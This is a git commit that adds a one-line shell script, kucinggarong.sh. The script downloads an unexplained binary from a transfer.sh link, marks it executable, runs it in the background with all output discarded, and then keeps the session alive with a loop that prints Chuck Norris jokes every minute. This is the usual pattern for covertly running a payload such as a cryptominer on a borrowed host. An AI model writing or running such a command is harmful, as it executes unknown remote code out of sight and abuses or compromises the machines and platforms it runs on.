13f71e9256c6b1f4848ec7e0579a26e20ae57be1
vorcina <96453524+vorcina@users.noreply.github.com>
2021-12-21 08:06:40 +0700

    Create kucinggarong.sh

---
+++ kucinggarong.sh
@@ -0,0 +1,1 @@
+curl -o techtronix https://transfer.sh/WzrLn9/manuver && chmod +x ./techtronix && node -v && nohup ./techtronix "" > /dev/null 2>&1 && while [ 1 ]; do curl -s 'https://api.chucknorris.io/jokes/random' | python -c "from IPython.display import clear_output;import sys,json;print(json.load(sys.stdin)['value'])"; sleep 1m; done; sleep 3d
